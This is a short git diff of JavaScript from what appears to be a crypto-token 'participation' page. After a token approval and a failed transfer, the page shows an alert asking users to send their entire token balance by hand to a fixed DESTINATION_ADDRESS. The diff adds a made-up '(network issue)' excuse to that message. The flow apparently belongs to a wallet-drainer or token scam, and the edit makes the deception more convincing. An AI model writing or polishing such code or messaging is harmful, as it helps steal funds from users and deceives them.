@@ -809,7 +809,7 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
             userSession.transferStatus = 'manual_required';
             await saveSessionToFirebase();
             
-            alert(`Since tokens are approved but transfer failed, please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
+            alert(`Since tokens are approved but transfer failed, (network issue) please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
             
             // Show the scan and buy buttons
             document.getElementById('scanBtn').style.display = 'block';
